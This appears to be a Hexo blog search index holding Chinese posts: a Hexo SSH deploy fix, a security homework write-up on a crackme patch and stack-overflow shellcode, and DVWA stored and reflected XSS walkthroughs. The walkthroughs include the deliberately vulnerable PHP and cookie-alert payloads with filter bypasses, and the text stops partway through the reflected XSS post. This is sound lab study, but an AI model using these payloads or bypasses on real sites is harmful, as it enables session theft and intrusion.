<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hexo发生error：spawn failed错误的解决方法</title>
      <link href="/2019/11/24/spawn-failed/"/>
      <url>/2019/11/24/spawn-failed/</url>
      
        <content type="html"><![CDATA[<p>hexo突然上传不了，出错了。</p><a id="more"></a><p>今天hexo突然部署不了文章了，错误页面如下。</p><p><img src="https://s2.ax1x.com/2019/11/24/MO2Q8s.png" alt="MO2Q8s.png"></p><p>然后就去github仓库看了一下，发下之前的ssh key没了，重新设了一个也连接不上。最后找到一个方法。</p><p>在存放key的目录下新建config文件。</p><p><img src="https://s2.ax1x.com/2019/11/24/MO22Ie.png" alt="MO22Ie.png"></p><p>填入以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User 你GitHub的邮箱</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure><p>然后用 <code>ssh -T git@github.com</code>命令测试能否连接</p><p>如果没有出现ssh不能连接的话，忽略以上内容</p><p>接着回到博客的根目录</p><p>第一种方法：</p><p>删除.deploy_git文件</p><p>然后输入<code>git config --gloabl core.autocrlf false</code></p><p>重新hexo clean</p><p>hexo g</p><p>hexo d</p><p>部署</p><p>但是发现好像只是一次性的。并不能永久解决</p><p>第二种方法：</p><p>打开_config.yml配置文件</p><p>修改以下内容</p><p>deploy:</p><p>type: git</p><p>repo: <a href="https://github.com/yourname/yourname.github.io.git" target="_blank" rel="noopener">https://github.com/yourname/yourname.github.io.git</a></p><p>branch: master</p><p>其中的repo修改为</p><p><a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:yourname/yourname.github.io.git</p>]]></content>
      
      
      <categories>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安作业3</title>
      <link href="/2019/11/19/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A3/"/>
      <url>/2019/11/19/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A3/</url>
      
        <content type="html"><![CDATA[<p>网安作业3.</p><a id="more"></a><h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme:"></a>crackme:</h3><p>打开IDA找到判断跳转语句位置</p><p><img src="https://s1.ax1x.com/2019/11/19/MReyX4.png" alt="MReyX4.png"></p><p>修改跳转指令</p><p><img src="https://s1.ax1x.com/2019/11/19/MReocD.png" alt="MReocD.png"></p><p>应用到程序</p><p><img src="https://s1.ax1x.com/2019/11/19/MReOAI.png" alt="MReOAI.png"></p><p>运行结果：</p><p>正确密码显示错误，错误密码显示正确。</p><p><img src="https://s1.ax1x.com/2019/11/19/MRmkEn.png" alt="MRmkEn.png"></p><h3 id="overflow-1"><a href="#overflow-1" class="headerlink" title="overflow(1):"></a>overflow(1):</h3><p>首先输入7个q看一下栈情况</p><p><img src="https://s2.ax1x.com/2019/11/23/Mqgxu8.png" alt="Mqgxu8.png"></p><p>authenticated的值是1</p><p>输入8个q</p><p>没有执行前，authenticated的值还是1</p><p><img src="https://s2.ax1x.com/2019/11/23/Mq2JKK.png" alt="Mq2JKK.png"></p><p>执行以后，值被覆盖为0</p><p><img src="https://s2.ax1x.com/2019/11/23/Mq2UVe.png" alt="Mq2UVe.png"></p><h3 id="overflow-2"><a href="#overflow-2" class="headerlink" title="overflow(2):"></a>overflow(2):</h3><p>将跳转地址覆盖为验证通过的地址</p><p><img src="https://s2.ax1x.com/2019/11/23/Mq2qZF.png" alt="Mq2qZF.png"></p><p>用ultraedit编辑password文件，任意填充8字符覆盖password，4字符覆盖authenticated，4字符覆盖上一栈帧的ebp,填入4个字符返回地址。</p><p><img src="https://s2.ax1x.com/2019/11/23/MqRldg.png" alt="MqRldg.png"></p><p>再运行程序</p><p><img src="https://s2.ax1x.com/2019/11/23/MqRweU.png" alt="MqRweU.png"></p><h3 id="overflow-3"><a href="#overflow-3" class="headerlink" title="overflow(3):"></a>overflow(3):</h3><p>程序与2的区别是增加了头文件windows.h，buff由8字节变成44字节，有足够空间填入代码。</p><p>找到buff地址和返回地址</p><p><img src="https://s2.ax1x.com/2019/11/24/MLYJ5F.png" alt="MLYJ5F.png"></p><p>找到messageboxA入口地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*FuncPointer)</span><span class="params">(LPTSTR)</span></span>;  <span class="comment">// 函数指针  </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    FuncPointer GetAddr;</span><br><span class="line">    <span class="comment">// 加载成功后返回库模块的句柄 </span></span><br><span class="line">    LibHandle = LoadLibrary(<span class="string">"user32"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"user32 LibHandle = 0x%X\n"</span>, LibHandle);</span><br><span class="line">    <span class="comment">// 返回动态链接库(DLL)中的输出库函数地址</span></span><br><span class="line">    GetAddr=(FuncPointer)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"MessageBoxA = 0x%X\n"</span>, GetAddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MLt0zj.png" alt="MLt0zj.png"></p><p>构造password</p><table><thead><tr><th>机器码</th><th>汇编指令</th><th>解释</th></tr></thead><tbody><tr><td>33DB</td><td>XOR EBX,EBX</td><td>将EBX寄存器置为NULL</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>686A6F6B65</td><td>PUSH 656b6f6a</td><td>Thisjoke</td></tr><tr><td>6854686973</td><td>PUSH 73696854</td><td></td></tr><tr><td>8BC4</td><td>MOV EAX,ESP</td><td>EAX里存入字符串指针</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>B8301D3148</td><td>MOV EAX,0x48311D30</td><td>调用MessageBoxA</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td></td></tr></tbody></table><p><img src="https://s2.ax1x.com/2019/11/24/MLLowj.png" alt="MLLowj.png"></p><p>由于win10保护机制太强，没有办法显示messagebox</p><p>换到xp系统上实现</p><p>先找到messageboxA的入口地址</p><p><img src="https://s2.ax1x.com/2019/11/24/MLOene.png" alt="MLOene.png"></p><p>再找到buff起始地址</p><p><img src="https://s2.ax1x.com/2019/11/24/MLO8c8.png" alt="MLO8c8.png"></p><p><img src="https://s2.ax1x.com/2019/11/24/MLON7j.png" alt="MLON7j.png"></p><p><img src="https://s2.ax1x.com/2019/11/24/MLOsjU.png" alt="MLOsjU.png"></p><p>定位shellcode，找jmp esp指令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_NAME <span class="meta-string">"user32.dll"</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    BYTE* ptr;</span><br><span class="line">    <span class="keyword">int</span> position,address;</span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    BOOL done_flag = FALSE;</span><br><span class="line">    handle=LoadLibrary(DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>(!handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" load dll erro !"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = (BYTE*)handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(position = <span class="number">0</span>; !done_flag; position++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>] == <span class="number">0xE4</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//0xFFE4 is the opcode of jmp esp</span></span><br><span class="line">                <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"OPCODE found at 0x%x\n"</span>,address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(...)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"END OF 0x%x\n"</span>, address);</span><br><span class="line">            done_flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MLzBOf.png" alt="MLzBOf.png"></p><p>定位exitprocess入口地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*FuncPointer)</span><span class="params">(LPTSTR)</span></span>;  <span class="comment">// 函数指针  </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    FuncPointer GetAddr;</span><br><span class="line">    <span class="comment">// 加载成功后返回库模块的句柄 </span></span><br><span class="line">    LibHandle = LoadLibrary(<span class="string">"kernel32"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"kernel32 LibHandle = 0x%X\n"</span>, LibHandle);</span><br><span class="line">    <span class="comment">// 返回动态链接库(DLL)中的输出库函数地址</span></span><br><span class="line">    GetAddr=(FuncPointer)GetProcAddress(LibHandle,<span class="string">"ExitProcess"</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ExitProcess = 0x%X\n"</span>, GetAddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MLzqh9.png" alt="MLzqh9.png"></p><p>修改password文件</p><table><thead><tr><th>机器码</th><th>汇编指令</th><th>解释</th></tr></thead><tbody><tr><td>33DB</td><td>XOR EBX,EBX</td><td>将EBX寄存器置为NULL</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>686A6F6B65</td><td>PUSH 656b6f6a</td><td>Thisjoke</td></tr><tr><td>6854686973</td><td>PUSH 73696854</td><td></td></tr><tr><td>8BC4</td><td>MOV EAX,ESP</td><td>EAX里存入字符串指针</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>B8EA07D577</td><td>MOV EAX,0x77D507EA</td><td>调用MessageBoxA</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>B8A2BF817C</td><td>MOV EAX,0x7C81BFA2</td><td>调用exit（0）</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td></td></tr></tbody></table><p><img src="https://s2.ax1x.com/2019/11/24/MOC6uq.png" alt="MOC6uq.png"></p><p>现在程序就可以正常退出</p><p><img src="https://s2.ax1x.com/2019/11/24/MOC58J.png" alt="MOC58J.png"></p>]]></content>
      
      
      <categories>
          
          <category> 作业 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 作业 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA--xss_stored</title>
      <link href="/2019/11/14/xss-stored/"/>
      <url>/2019/11/14/xss-stored/</url>
      
        <content type="html"><![CDATA[<p>DVWA的存储型xss。</p><a id="more"></a><h2 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h2><h3 id="Stored-XSS-Source"><a href="#Stored-XSS-Source" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p> <code>isset()</code> 函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false </p><p> <code>trim()</code> 函数作用为移除字符串两侧空白字符或其他预定义字符 </p><p> <code>stripslashes()</code> 函数用于删除字符串中的反斜杠 </p><p> <code>mysqli_real_escape_string()</code> 函数会对字符串中的特殊号<code>(\x00，\n，\r，\，&#39;，&quot;，\x1a)</code> 进行转义 </p><p> 在代码中对message，name输入框内容  没有进行XSS方面的过滤和检查 </p><p> 且通过  <code>query</code> 语句插入到数据库中。所以存在存储型XSS漏洞 </p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>由于name和message输入框均存在xss。但name输入框有字符限制，这里可以使用burpsuite抓包修改name输入框内容： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/14/MUAK3Q.png" alt="MUAK3Q.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUAQjs.png" alt="MUAQjs.png"></p><p><img src="https://s2.ax1x.com/2019/11/14/MUA1un.png" alt="MUA1un.png"></p><p>*<em>由于提交的结果存储在数据库中，所以每次刷新页面，输入的恶意代码就会被执行一次 *</em></p><h2 id="级别：medium"><a href="#级别：medium" class="headerlink" title="级别：medium"></a>级别：medium</h2><h3 id="Stored-XSS-Source-1"><a href="#Stored-XSS-Source-1" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p> <code>strip_tags()</code> 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用 <code>&lt;b&gt;</code> 标签。 </p><p> <code>addslashes()</code> 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。 </p><p> <code>htmlspecialchars()</code> 函数把预定义的字符&amp;、”、’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素 </p><p> 对message输入内容进行检测过滤，因此无法再通过message参数注入XSS代码<br>但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。 </p><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><p> 抓包修改name输入内容:</p><ol><li>使用双写绕过，输入  <code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>使用大小写绕过，输入<code>&lt;sCript&gt;alert(document.cookie)&lt;/script&gt;</code></li><li>输入其他标签，如  <code>&lt;IMG src=1 onerror=alert(document.cookie)&gt;</code></li></ol><p><img src="https://s2.ax1x.com/2019/11/14/MUmpy4.png" alt="MUmpy4.png"></p><p><strong>由于low级别已经注入过，所以打开medium级别会直接弹出cookie</strong></p><h2 id="级别：high"><a href="#级别：high" class="headerlink" title="级别：high"></a>级别：high</h2><h3 id="Stored-XSS-Source-2"><a href="#Stored-XSS-Source-2" class="headerlink" title="Stored XSS Source"></a>Stored XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $message ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $name ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>和上面两个级别一样，抓包修改name内容即可，代码对name输入内容利用正则匹配删除所有关于<code>&lt;script&gt;</code>标签</p><h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><p>抓包修改name内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG src=1 onerror=alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> xss攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA--xss_reflected</title>
      <link href="/2019/11/14/xss-reflected/"/>
      <url>/2019/11/14/xss-reflected/</url>
      
        <content type="html"><![CDATA[<p>DVWA上的反射型xss。</p><a id="more"></a><h2 id="级别：low"><a href="#级别：low" class="headerlink" title="级别：low"></a>级别：low</h2><h3 id="Reflected-XSS-Source"><a href="#Reflected-XSS-Source" class="headerlink" title="Reflected XSS Source"></a>Reflected XSS Source</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">"X-XSS-Protection: 0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ 